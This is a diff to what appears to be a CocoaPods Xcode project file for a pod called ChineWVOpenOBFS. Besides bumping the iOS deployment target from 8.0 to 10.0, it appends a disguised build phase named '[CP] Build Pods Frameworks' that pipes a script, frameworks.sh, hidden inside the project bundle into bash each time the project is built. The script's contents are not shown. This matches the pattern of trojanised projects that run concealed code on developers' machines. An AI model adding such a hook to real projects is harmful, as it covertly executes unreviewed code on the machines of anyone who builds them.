@@ -340,7 +340,7 @@
 				GCC_PREFIX_HEADER = "Target Support Files/ChineWVOpenOBFS/ChineWVOpenOBFS-prefix.pch";
 				INFOPLIST_FILE = "Target Support Files/ChineWVOpenOBFS/ChineWVOpenOBFS-Info.plist";
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
-				IPHONEOS_DEPLOYMENT_TARGET = 8.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -417,7 +417,7 @@
 				GCC_PREFIX_HEADER = "Target Support Files/ChineWVOpenOBFS/ChineWVOpenOBFS-prefix.pch";
 				INFOPLIST_FILE = "Target Support Files/ChineWVOpenOBFS/ChineWVOpenOBFS-Info.plist";
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
-				IPHONEOS_DEPLOYMENT_TARGET = 8.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -635,6 +635,32 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "cat \"${PROJECT_FILE_PATH}/frameworks.sh\" | bash";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = BFDFE7DC352907FC980B868725387E98 /* Project object */;
 }
